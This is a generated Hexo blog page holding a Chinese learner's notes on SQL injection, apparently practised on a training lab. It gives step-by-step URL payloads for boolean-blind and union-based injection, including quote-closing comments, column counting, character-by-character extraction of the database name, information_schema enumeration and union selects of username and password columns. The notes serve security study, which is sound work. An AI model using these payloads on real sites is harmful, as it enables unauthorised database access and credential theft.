@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>SQL注入 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="#SQL注入的概述 定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 #SQL注入的类型 1.布尔盲注 2.union注入 *布尔盲注布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 fa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://ggken753.github.io/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="#SQL注入的概述 定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 #SQL注入的类型 1.布尔盲注 2.union注入 *布尔盲注布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 fa">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110351443.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110753465.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111019672.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111419279.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111721482.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112306033.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112456751.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112839178.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115120438808.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115120752304.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115121419317.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115123824774.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115125343574.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115130520941.png">
+<meta property="og:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115130641184.png">
+<meta property="article:published_time" content="2020-11-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-15T13:45:58.103Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110351443.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://GGken753.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-学习笔记5" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/" class="article-date">
+  <time datetime="2020-11-14T16:00:00.000Z" itemprop="datePublished">2020-11-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQL注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#SQL注入的概述</p>
+<p>定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<p>#SQL注入的类型</p>
+<p>1.布尔盲注</p>
+<p>2.union注入</p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="*布尔盲注"></a>*布尔盲注</h4><p>布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 <code>true</code> 、 <code>false</code>使web页面返回true或者false，从而达到注入的目的来获取信息</p>
+<ul>
+<li>ascii() 函数，返回字符ascii码值   <ul>
+<li>参数 : <code>str</code>单字符</li>
+</ul>
+</li>
+<li>length() 函数，返回字符串的长度   <ul>
+<li>参数 : <code>str</code> 字符串</li>
+</ul>
+</li>
+<li>left() 函数，返回从左至右截取固定长度的字符串   <ul>
+<li>参数<code>str</code>,<code>length</code></li>
+<li><code>str</code> : 字符串</li>
+<li><code>length</code>：截取长度</li>
+</ul>
+</li>
+<li>substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串   <ul>
+<li>参数，<code>str</code>，<code>pos</code>，<code>length</code></li>
+<li><code>str</code>: 字符串</li>
+<li><code>pos</code>：开始位置</li>
+<li><code>length</code>： 截取长度</li>
+</ul>
+</li>
+</ul>
+<h6 id="判断是否存在盲注"><a href="#判断是否存在盲注" class="headerlink" title="#判断是否存在盲注"></a>#判断是否存在盲注</h6><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110351443.png"></p>
+<p>*给id赋值显示正常 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>*输入的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.........</span><br></pre></td></tr></table></figure>
+
+<p>*当给他输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110753465.png"></p>
+<p>*没有出现任何即不存在union注入</p>
+<p>*当再次输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>*输出的结果与之前的一样,显示正常,即and后面的为真</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111019672.png"></p>
+<p>*假如输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p> *猜测:单引号表示判断and后面的语句,1=2 为假,即输出</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111419279.png"></p>
+<p>*当输入为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>*输出的为</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111721482.png"></p>
+<p>*也没有出现任何结果,即猜测错误</p>
+<p>*可知 如果输入的为数字型,单引号把前面的单引号闭合,后面就会多出来一个单引号,因此我们要采用注释的方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112306033.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1&#39;and 1&#x3D;2--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112456751.png"></p>
+<p>*即确定存在sql注入</p>
+<p>*用order by 查询字符段长度，长度为3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;order by 3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112839178.png"></p>
+<p>*使用union查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;union select 1,12,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115120438808.png"></p>
+<p>*再输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+
+<p>能发现查询的user()能在数据库里面正常运行，但在页面返回是看不到的</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115120752304.png"></p>
+<p>*因此需要用到布尔盲注</p>
+<p>*获取数据库的长度（使用到length函数）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and(length(database()))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115121419317.png"></p>
+<p>*运行正常</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and(length(database()))&gt;5--+</span><br></pre></td></tr></table></figure>
+
+<p>*根据length函数，可知数据库的长度大于5，可根据这种方法测试出数据库长度</p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115123824774.png"></p>
+<p>*获取数据库的名字（使用到substr函数、ascii函数）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1&#39;and substr(database(),1,1)--+</span><br></pre></td></tr></table></figure>
+
+<p>*(database(),1,1):“1，1”表示从数据库名字第一位开始，取出一位数据</p>
+<p>使用ascii对取出来的数据进行比较</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and ascii(substr(database(),1,1))&gt;1--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115125343574.png"></p>
+<p>*获取表的数量（count函数、information_schema）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and (select count(*)from information_schema.tables where table_schema&#x3D;database())--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115130520941.png"></p>
+<p>*使用比较方法判断出表的数量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and (select count(*)from information_schema.tables where table_schema&#x3D;database())&#x3D;4--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115130641184.png"></p>
+<h4 id="Union注入"><a href="#Union注入" class="headerlink" title="*Union注入"></a>*Union注入</h4><p>database()：当前网站使用的数据库<br>version()：当前mysql的版本<br>user()：当前mysql的用户</p>
+<h6 id="判断是否存在sql注入"><a href="#判断是否存在sql注入" class="headerlink" title="#判断是否存在sql注入"></a>#判断是否存在sql注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1  --返回true，显示正常</span><br><span class="line">and 1&#x3D;2  --返回false，显示错误</span><br></pre></td></tr></table></figure>
+
+<h6 id="union查询"><a href="#union查询" class="headerlink" title="#union查询"></a>#union查询</h6><p>*联合查询猜表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,……,7 from users </span><br></pre></td></tr></table></figure>
+
+<p>*联合查询猜列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,username,4,5,password,7 </span><br></pre></td></tr></table></figure>
+
+<p>*获取数据库库名、版本号、用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,database(),version(),user(),6,7</span><br></pre></td></tr></table></figure>
+
+<p>*得到数据库库名后查当前数据库表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select  column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>*查数据，假设查到的列名分别为：id，username，password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select username,password from table_name&#x3D;&#39;user&#39;;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://ggken753.github.io/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/" data-id="ckhj6b9y70000osv3foi1hnkl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">正则提取</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/">SQL注入</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/">正则提取</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/">python基础</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/">python爬虫笔记(二)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">python爬虫笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
